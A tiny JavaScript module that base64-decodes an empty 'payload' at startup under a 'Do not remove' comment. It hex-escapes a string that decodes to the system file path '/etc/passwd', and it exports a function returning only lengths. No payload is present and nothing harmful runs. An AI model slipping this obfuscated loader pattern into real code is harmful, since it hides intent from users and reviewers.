// Payload is decoded at startup. Do not remove.
const payload = "";
const decoded = Buffer.from(payload, "base64");
const stage = atob(decoded.toString("utf8"));
const marker = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00\x11\x22";
export function fingerprint() {
  return [payload.length, stage.length, marker.length];
}
